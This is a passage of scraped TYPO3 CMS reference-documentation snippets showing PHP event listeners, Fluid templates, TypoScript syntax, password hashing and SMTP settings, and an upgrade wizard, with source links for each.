https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Extbase/Configuration/BeforeFlexFormConfigurationOverrideEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Extbase\\EventListener;\n\nuse TYPO3\\CMS\\Extbase\\Event\\Configuration\\BeforeFlexFormConfigurationOverrideEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforeFlexFormConfigurationOverrideEvent $event): void\n    {\n        $originalFlexFormConfiguration = $event->getOriginalConfiguration();\n        $frameworkConfiguration = $event->getFrameworkConfiguration();\n        $flexFormConfiguration = $event->getConfiguration();\n\n        // Implement your custom override process here\n        $modifiedFlexFormConfiguration = $this->processConfiguration(\n            $originalFlexFormConfiguration,\n            $frameworkConfiguration,\n            $flexFormConfiguration\n        );\n\n        $event->setConfiguration($modifiedFlexFormConfiguration);\n    }\n\n    private function processConfiguration(array $original, array $framework, array $flexForm): array\n    {\n        // Custom override logic\n        return $flexForm;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Localization Labels in Fluid Templates - HTML\nDESCRIPTION: This snippet shows how to access localized labels using the Fluid template engine in TYPO3. Labels can be fetched using a shorthand or the full path depending on the context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Private/Language.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<f:translate key=\"key1\" extensionName=\"MyExtension\"/>\n```\n\nLANGUAGE: html\nCODE:\n```\n<f:translate key=\"LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:key1\" />\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFolderCopiedEvent Class in PHP\nDESCRIPTION: This code snippet defines the AfterFolderCopiedEvent class in the TYPO3 CMS Core Resource namespace. It includes properties for the copied folder, target folder, and resource storage, along with getter methods for accessing these properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFolderCopiedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class AfterFolderCopiedEvent\n{\n    public function __construct(\n        private readonly Folder $folder,\n        private readonly Folder $targetFolder,\n        private readonly ResourceStorage $storage\n    ) {\n    }\n\n    public function getFolder(): Folder\n    {\n        return $this->folder;\n    }\n\n    public function getTargetFolder(): Folder\n    {\n        return $this->targetFolder;\n    }\n\n    public function getStorage(): ResourceStorage\n    {\n        return $this->storage;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating from CompileWithContentArgumentAndRender Trait (PHP)\nDESCRIPTION: Example of migrating a ViewHelper from using the deprecated CompileWithContentArgumentAndRender trait to using the render() method and renderChildren() method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_12\n\nLANGUAGE: PHP\nCODE:\n```\n..  literalinclude:: _CustomViewHelper/_MigrateCompileWithContentArgumentAndRender.diff\n    :caption: EXT:my_extension/Classes/ViewHelpers/GravatarViewHelper.php (diff removing CompileWithContentArgumentAndRender)\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterContentHasBeenFetchedEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates an event listener class that uses the AfterContentHasBeenFetchedEvent to remove specific page content elements based on field values. It utilizes the PHP attribute #[AsEventListener] for registration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/AfterContentHasBeenFetchedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Frontend\\Event\\AfterContentHasBeenFetchedEvent;\n\nfinal class MyEventListener\n{\n    #[AsEventListener]\n    public function __invoke(AfterContentHasBeenFetchedEvent $event): void\n    {\n        $contentElements = $event->getContentElements();\n\n        $filteredContentElements = array_filter(\n            $contentElements,\n            static function (array $contentElement) {\n                return $contentElement['header'] !== 'Do not show this';\n            }\n        );\n\n        $event->setContentElements($filteredContentElements);\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Assigning Values in TypoScript TypoScript\nDESCRIPTION: This code snippet demonstrates various ways of assigning values to identifiers in TypoScript. It illustrates how values can be set and overwritten, how value assignment handles comments, and the usage of constants within value expressions. These examples are crucial for configuring TYPO3 CMS setups by defining parameter values within the TypoScript configuration files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/OperatorAssignment.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n# Identifier \\\"myIdentifier\\\" is set to the value \\\"foo\\\"\nmyIdentifier = foo\n\n# Identifier path \\\"myIdentifier.mySubIdentifier\\\" is set to the value \\\"foo\\\"\nmyIdentifier.mySubIdentifier = foo\n\n# \\\"myIdentifier.mySubIdentifier\\\" it set to the value \\\"foo\\\",\\n# but is immediately overwritten to value \\\"bar\\\"\nmyIdentifier.mySubIdentifier = foo\nmyIdentifier.mySubIdentifier = bar\n\n# Same as above, value of \\\"myIdentifier.mySubIdentifier\\\" is \\\"bar\\\"\nmyIdentifier.mySubIdentifier = foo\nmyIdentifier {\n   mySubIdentifier = bar\n}\n\n# Value assignments are not comment-aware, \\\"#\\\", \\\"//\\\" and \\\"/*\\\" after a\\n# \\\"=\\\" operator do not start a comment. The value of identifier\\n# \\\"myIdentifier.mySubIdentifier\\\" is \\\"foo // not a comment\\\"\nmyIdentifier.mySubIdentifier = foo // not a comment\n\n# Value assignment using a constant:\\n# Ends up as \\\"foo myConstantValue bar\\\" if constant \\\"myConstant\\\" is set to \\\"myConstantValue\\\"\\n# Ends up as \\\"foo {$myConstantValue} bar\\\" if constant \\\"myConstant\\\" is not set\nmyIdentifier. mySubIdentifier = foo {$myConstantValue} bar\n\n```\n\n----------------------------------------\n\nTITLE: Assigning Custom Password Policy in TYPO3\nDESCRIPTION: Configuration to assign a custom password policy 'simple' to both frontend and backend contexts.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/PasswordPolicies/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['passwordPolicy'] = 'simple';\n$GLOBALS['TYPO3_CONF_VARS']['FE']['passwordPolicy'] = 'simple';\n```\n\n----------------------------------------\n\nTITLE: Configuring Password Hashing in TYPO3 System Settings\nDESCRIPTION: PHP configuration code to manually disable argon2 in the TYPO3 config/system/settings.php file, setting BcryptPasswordHash as the hashing algorithm for both backend and frontend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PasswordHashing/Troubleshooting.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\nreturn [\n   'BE' => [\n      // ...\n      // This pseudo password enables you to load the standalone install\n      // tool to be able to generate a new hash value. Change the password\n      // at once!\n      'installToolPassword' => '$2y$12$AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',\n      'passwordHashing' => [\n         'className' => 'TYPO3\\\\CMS\\\\Core\\\\Crypto\\\\PasswordHashing\\\\BcryptPasswordHash',\n         'options' => [],\n      ],\n   ],\n   'FE' => [\n      // ...\n      'passwordHashing' => [\n         'className' => 'TYPO3\\\\CMS\\\\Core\\\\Crypto\\\\PasswordHashing\\\\BcryptPasswordHash',\n         'options' => [],\n      ],\n   ],\n   // ...\n];\n```\n\n----------------------------------------\n\nTITLE: Implementing Integer Property Mapping in TYPO3 CMS PostController\nDESCRIPTION: This code snippet shows a method that demonstrates property mapping from a string to an integer in TYPO3 CMS. It uses the propertyMapper to convert a string input to an integer output.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/PropertyManager/IntegerMapping.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Property\\Exception;\n\nclass PostController extends AbstractController\n{\n    /**\n     * This method demonstrates property mapping to an integer\n     * @throws Exception\n     */\n    protected function mapIntegerFromString(string $numberString = '42'): int\n    {\n        return $output = $this->propertyMapper->convert($numberString, 'integer');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking DB Mount Access in TYPO3\nDESCRIPTION: Determines if a page is within the database mount points of the current backend user.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['BE_USER']->isInWebMount($id)\n```\n\n----------------------------------------\n\nTITLE: Querying with HiddenRestriction in PHP\nDESCRIPTION: Example of how the HiddenRestriction evaluates the TCA configuration and adds a WHERE clause to exclude hidden records.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/RestrictionBuilder/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n['ctrl']['enablecolumns']['disabled']\n```\n\nLANGUAGE: SQL\nCODE:\n```\nAND hidden = 0\n```\n\n----------------------------------------\n\nTITLE: Accessing Frontend Cache Instruction in Early Middleware in TYPO3\nDESCRIPTION: This code demonstrates how to safely access and modify the frontend cache instruction in an early middleware before the typo3/cms-frontend/tsfe middleware is executed. It shows proper null coalescing to handle cases where the attribute might not exist yet.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/FrontendCacheInstruction.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Middleware;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse Psr\\Http\\Server\\MiddlewareInterface;\nuse Psr\\Http\\Server\\RequestHandlerInterface;\nuse TYPO3\\CMS\\Frontend\\Cache\\CacheInstruction;\n\nfinal class MyEarlyMiddleware implements MiddlewareInterface\n{\n    public function process(ServerRequestInterface $request, RequestHandlerInterface $handler): ResponseInterface\n    {\n        // Get instruction. The attribute may not exist yet in early middlewares.\n        // Thus, create an empty instruction if none exists.\n        $cacheInstruction = $request->getAttribute('frontend.cache.instruction') ?? new CacheInstruction();\n        // Force caching being disabled:\n        $cacheInstruction = $cacheInstruction->withDisabledCache();\n        // OR re-enable caching, which is actually the default when creating a new instruction:\n        // $cacheInstruction = $cacheInstruction->withEnabledCache();\n        // Set the result back to the request\n        $request = $request->withAttribute('frontend.cache.instruction', $cacheInstruction);\n        return $handler->handle($request);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Card Grid Layout in reStructuredText for TYPO3 Documentation\nDESCRIPTION: This snippet defines a card grid layout with responsive columns and specific styling. It includes three cards for TYPO3 installation, common directory structure, and upgrading TYPO3, each with brief descriptions and links to more detailed documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  card-grid::\n    :columns: 1\n    :columns-md: 2\n    :gap: 4\n    :card-height: 100\n\n    ..  card:: TYPO3 installation\n\n        This chapter covers topics about :ref:`system-requirements`, :ref:`installation`,\n        :ref:`production-settings`, :ref:`deploytypo3` and :ref:`tunetypo3`.\n\n        :ref:`TYPO3 installation <installation_index>`\n\n    ..  card:: Common directory structure\n\n        This chapter describes the typical directory structure of a\n        `Composer-based <https://docs.typo3.org/permalink/t3coreapi:directory-structure>`_\n        and `Classic installation <https://docs.typo3.org/permalink/t3coreapi:classic-directory-structure>`_.\n\n        :ref:`Directory structure <directory-structure>`\n\n    ..  card:: Upgrading TYPO3\n\n        The TYPO3 upgrade guide explains how to do patch level updates and how\n        to update major Core versions and extensions.\n\n        It also explains how to :ref:`Migrate a TYPO3 project to\n        Composer <migratetocomposer>`.\n\n        :ref:`TYPO3 Upgrade Guide <upgrading>`\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for TYPO3 Error Handling\nDESCRIPTION: ReStructuredText markup defining the documentation structure for TYPO3's error handling system, including index entries and table of contents.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. index::\n   ! Errors\n   ! Exceptions\n.. _error-handling:\n\n================================\nError and exception handling\n================================\n\nTYPO3 has a built-in error and exception handling system. Administrators can\nconfigure how errors and exceptions are displayed in both the backend and the\nfrontend.\n\n.. rst-class:: compact-list\n.. toctree::\n\n   Configuration/Index\n   ErrorHandler/Index\n   ProductionExceptionHandler/Index\n   DebugExceptionHandler/Index\n   Examples/Index\n   Extending/Index\n```\n\n----------------------------------------\n\nTITLE: Accessing Module Data Properties in TYPO3\nDESCRIPTION: This method retrieves the value of a specific property from the module data. If the property doesn't exist, it returns the provided default value (which is NULL by default).\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/ModuleData.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: get(string $propertyName, ?mixed $default = NULL)\n        :returns: `?mixed`\n\n        :param $propertyName: the propertyName\n        :param $default: the default, default: NULL\n```\n\n----------------------------------------\n\nTITLE: Debugging Cookies in TYPO3 Extension Controller (PHP)\nDESCRIPTION: This code snippet defines a ModuleController class that extends ActionController and implements LoggerAwareInterface. It includes a method to debug cookies using TYPO3's DebugUtility.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Debugging/DebugCookies.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Utility\\DebugUtility;\n\nclass ModuleController extends ActionController implements LoggerAwareInterface\n{\n    protected function debugCookies() {\n        DebugUtility::debug($_COOKIE, 'cookie');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Mapping String to Object in Extbase\nDESCRIPTION: This snippet shows the conversion of a string into a model object in TYPO3 using the Extbase PropertyMapper. The output is a new object instance with the specified properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/PropertyMapping.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n\\include :: /CodeSnippets/Extbase/PropertyManager/ObjectMapping.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Implementing Password Validation Context Event Listener in TYPO3\nDESCRIPTION: Example implementation of an event listener for EnrichPasswordValidationContextDataEvent that enriches password validation context data. The listener handles userData retrieval and context processing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/PasswordPolicy/EnrichPasswordValidationContextDataEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Redirects\\EventListener;\n\nuse TYPO3\\CMS\\Core\\PasswordPolicy\\Event\\EnrichPasswordValidationContextDataEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(EnrichPasswordValidationContextDataEvent $event): void\n    {\n        $data = $event->getContextData();\n        $userData = $event->getUserData();\n        $initiatingClass = $event->getInitiatingClass();\n        // Enrich data ...\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom TypoScript Modifier Function - TypoScript Example\nDESCRIPTION: Example showing how to use a custom modifier function in TypoScript configuration. The example demonstrates setting an original value and applying a custom modifier function with an argument.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/TypoScript/EvaluateModifierFunctionEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nsomeIdentifier = originalValue\nsomeIdentifier := myModifierFunction(myFunctionArgument)\n```\n\n----------------------------------------\n\nTITLE: Configuring Crop Area in TYPO3 CMS\nDESCRIPTION: Configuration for defining an initial crop area with relative coordinates and dimensions for the mobile variant.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CropVariants/General/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n'config' => [\n    'type' => 'imageManipulation',\n    'cropVariants' => [\n        'mobile' => [\n            'title' => 'LLL:EXT:ext_key/Resources/Private/Language/locallang.xlf:imageManipulation.mobile',\n            'cropArea' => [\n                'x' => 0.1,\n                'y' => 0.1,\n                'width' => 0.8,\n                'height' => 0.8,\n            ],\n        ],\n    ],\n]\n```\n\n----------------------------------------\n\nTITLE: Content Partial in HTML\nDESCRIPTION: Shows a Fluid partial for rendering page content, using TYPO3-specific ViewHelpers to fetch and render content elements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Introduction.rst#2025-04-16_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n<f:for each=\"{contentCollections}\" as=\"contentCollection\">\n    <f:for each=\"{contentCollection}\" as=\"element\">\n        <f:render partial=\"Content/Element\" arguments=\"{element: element}\" />\n    </f:for>\n</f:for>\n```\n\n----------------------------------------\n\nTITLE: Implementing a Form Display Action in TYPO3 BlogController\nDESCRIPTION: This code defines a BlogController class with a newAction method that displays a form for creating a new blog. The method assigns both the new blog instance and a list of administrators to the view, then returns an HTML response.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Controllers/BlogControllerNew.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse T3docs\\BlogExample\\Domain\\Model\\Blog;\n\nclass BlogController extends AbstractController\n{\n    /**\n     * Displays a form for creating a new blog\n     */\n    public function newAction(?Blog $newBlog = null): ResponseInterface\n    {\n        $this->view->assignMultiple([\n            'newBlog' => $newBlog,\n            'administrators' => $this->administratorRepository->findAll(),\n        ]);\n        return $this->htmlResponse();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Middleware for TYPO3 Message Bus\nDESCRIPTION: YAML configuration to add custom middleware to the message bus. This example demonstrates how to tag the middleware and set its execution order using before/after directives.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MessageBus/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: YAML\nCODE:\n```\nservices:\n  MyVendor\\MyExtension\\Queue\\Middleware\\DemoMiddleware:\n    tags:\n      - name: 'messenger.middleware'\n        # These attributes define the order\n        after: 'Symfony\\Component\\Messenger\\Middleware\\SendMessageMiddleware'\n        before: 'Symfony\\Component\\Messenger\\Middleware\\HandleMessageMiddleware'\n```\n\n----------------------------------------\n\nTITLE: Custom TypoScript Modifier Event Listener - PHP Implementation\nDESCRIPTION: Implementation of an event listener class that handles the custom TypoScript modifier function. Located in the extension's EventListener directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/TypoScript/EvaluateModifierFunctionEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n..  literalinclude:: _EvaluateModifierFunctionEvent/_MyEventListener.php\n```\n\n----------------------------------------\n\nTITLE: Configuring Categories in TYPO3 TCA\nDESCRIPTION: Adds a category field to a TYPO3 table configuration and registers it in the TCA. Uses the ExtensionManagementUtility to make the field available in all types of the specified table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Categoy/CategorySimple.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TCA'][$myTable]['columns']['categories'] = [\n   'config' => [\n      'type' => 'category'\n   ]\n];\n\n\\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::addToAllTCAtypes(\n   $myTable,\n   'categories'\n);\n```\n\n----------------------------------------\n\nTITLE: Running Functional Tests with MySQLi in TYPO3 Projects using DDEV\nDESCRIPTION: Bash command to execute functional tests using MySQLi database driver in a DDEV environment, specifying database connection details for TYPO3 projects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/ProjectTesting.rst#2025-04-16_snippet_8\n\nLANGUAGE: Bash\nCODE:\n```\nddev exec \\\n    typo3DatabaseDriver='mysqli' \\\n    typo3DatabaseHost='db' \\\n    typo3DatabasePort=3306 \\\n    typo3DatabaseUsername='root' \\\n    typo3DatabasePassword='root' \\\n    typo3DatabaseName='func' \\\n    php vendor/bin/phpunit -c Build/phpunit/FunctionalTests.xml\n```\n\n----------------------------------------\n\nTITLE: Loading Category Collections in TYPO3 Frontend\nDESCRIPTION: This snippet demonstrates how to load a collection of records related to a specific category using the CategoryCollection class. It iterates through the collection and keeps track of categories per record.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Categories/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$collection = \\TYPO3\\CMS\\Frontend\\Category\\Collection\\CategoryCollection::load(\n   $aCategory,\n   true,\n   $table,\n   $relationField\n);\nif ($collection->count() > 0) {\n   // Add items to the collection of records for the current table\n   foreach ($collection as $item) {\n      $tableRecords[$item['uid']] = $item;\n      // Keep track of all categories a given item belongs to\n      if (!isset($categoriesPerRecord[$item['uid']])) {\n         $categoriesPerRecord[$item['uid']] = [];\n      }\n      $categoriesPerRecord[$item['uid']][] = $aCategory;\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Encryption - TYPO3 PHP\nDESCRIPTION: This snippet determines whether to use SSL/TLS encryption for the SMTP connection. It must not be enabled when connecting to port 587.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_encrypt'] = false;\n```\n\n----------------------------------------\n\nTITLE: Using If ViewHelper with Boolean Conditions\nDESCRIPTION: Demonstrates various ways to use boolean conditions with the if ViewHelper in Fluid templates.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_22\n\nLANGUAGE: none\nCODE:\n```\n<f:if condition=\"{myObject}\">\n  ...\n</f:if>\n\n<f:if condition=\"{myNumber} > 3 || {otherNumber} || {somethingelse}\">\n   <f:then>\n      ...\n   </f:then>\n   <f:else>\n      ...\n   </f:else>\n</f:if>\n\n<my:custom showLabel=\"{myString} === 'something'\">\n  ...\n</my:custom>\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Ping Threshold\nDESCRIPTION: This snippet sets the time interval in seconds between pings to the SMTP server. It ensures that the connection remains alive and messages can be sent without interruption.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_15\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_ping_threshold']\n:type: text\n:Default: ''\n\n*only with transport=smtp* Sets the minimum number of seconds required between two messages, before the server is pinged.\n```\n\n----------------------------------------\n\nTITLE: Implementing Switchable Controller Action Upgrade Wizard in TYPO3 CMS\nDESCRIPTION: This code snippet demonstrates how to create an upgrade wizard for migrating plugins with switchable controller actions to a new type in TYPO3 CMS. It includes methods for identifying affected records, performing the upgrade, and updating the database.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/UpdateExtensions/UpdateWizards/Examples.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Updates;\n\nuse TYPO3\\CMS\\Core\\Database\\Connection;\nuse TYPO3\\CMS\\Core\\Database\\ConnectionPool;\nuse TYPO3\\CMS\\Core\\Database\\Query\\Restriction\\DeletedRestriction;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse TYPO3\\CMS\\Install\\Updates\\DatabaseUpdatedPrerequisite;\nuse TYPO3\\CMS\\Install\\Updates\\UpgradeWizardInterface;\n\nclass SwitchableControllerActionUpgradeWizard implements UpgradeWizardInterface\n{\n    protected const OLD_PLUGIN_NAME = 'oldname';\n    protected const NEW_PLUGIN_NAME = 'newname';\n\n    public function getIdentifier(): string\n    {\n        return 'switchableControllerActionPluginUpgrade';\n    }\n\n    public function getTitle(): string\n    {\n        return 'Migrate all plugins with switchable controller actions';\n    }\n\n    public function getDescription(): string\n    {\n        return 'Migrates all plugins using switchable controller actions to new plugins.';\n    }\n\n    public function getPrerequisites(): array\n    {\n        return [\n            DatabaseUpdatedPrerequisite::class,\n        ];\n    }\n\n    public function updateNecessary(): bool\n    {\n        return $this->checkIfWizardIsRequired();\n    }\n\n    public function executeUpdate(): bool\n    {\n        return $this->performUpdate();\n    }\n\n    public function wizardIsComplete(): bool\n    {\n        return !$this->checkIfWizardIsRequired();\n    }\n\n    protected function checkIfWizardIsRequired(): bool\n    {\n        $queryBuilder = GeneralUtility::makeInstance(ConnectionPool::class)\n            ->getQueryBuilderForTable('tt_content');\n        $queryBuilder->getRestrictions()->removeAll()->add(GeneralUtility::makeInstance(DeletedRestriction::class));\n\n        $elementCount = $queryBuilder->count('uid')\n            ->from('tt_content')\n            ->where(\n                $queryBuilder->expr()->eq('CType', $queryBuilder->createNamedParameter('list')),\n                $queryBuilder->expr()->eq('list_type', $queryBuilder->createNamedParameter(self::OLD_PLUGIN_NAME))\n            )\n            ->executeQuery()\n            ->fetchOne();\n\n        return $elementCount > 0;\n    }\n\n    protected function performUpdate(): bool\n    {\n        $connection = GeneralUtility::makeInstance(ConnectionPool::class)->getConnectionForTable('tt_content');\n        $queryBuilder = $connection->createQueryBuilder();\n        $queryBuilder->getRestrictions()->removeAll()->add(GeneralUtility::makeInstance(DeletedRestriction::class));\n        $statement = $queryBuilder->select('uid', 'pi_flexform')\n            ->from('tt_content')\n            ->where(\n                $queryBuilder->expr()->eq('CType', $queryBuilder->createNamedParameter('list')),\n                $queryBuilder->expr()->eq('list_type', $queryBuilder->createNamedParameter(self::OLD_PLUGIN_NAME))\n            )\n            ->executeQuery();\n\n        $updates = [];\n        while ($record = $statement->fetchAssociative()) {\n            $updates[] = [\n                'uid' => $record['uid'],\n                'CType' => self::NEW_PLUGIN_NAME,\n                'list_type' => '',\n                'pi_flexform' => $this->migrateFlexForm($record['pi_flexform']),\n            ];\n        }\n\n        foreach ($updates as $update) {\n            $connection->update(\n                'tt_content',\n                $update,\n                ['uid' => (int)$update['uid']],\n                [Connection::PARAM_STR]\n            );\n        }\n\n        return true;\n    }\n\n    protected function migrateFlexForm(string $flexform): string\n    {\n        // Implement flexform migration logic here\n        return $flexform;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Integer Settings in YAML\nDESCRIPTION: Example of defining an integer type site setting with validation and default value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSettingDefinitions.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nsettings:\n  foo:\n    type: int\n    label: 'Foo'\n    default: 42\n```\n\n----------------------------------------\n\nTITLE: Setting Default Mail Reply-To Name\nDESCRIPTION: This snippet defines the default reply-to name used in TYPO3-generated emails when no other name is specified, aiding in establishing the sender's identity.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_24\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['defaultMailReplyToName']\n:type: text\n:Default: ''\n\nThis default name is used when no other 'reply-to' name is set for a TYPO3-generated email.\n```\n\n----------------------------------------\n\nTITLE: Displaying Custom Queue Flash Messages with Fluid ViewHelper (HTML)\nDESCRIPTION: Shows how to use the Fluid FlashMessages ViewHelper with a custom queue identifier to display messages from a specific flash message queue.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/Extbase.rst#2025-04-16_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<f:flashMessages 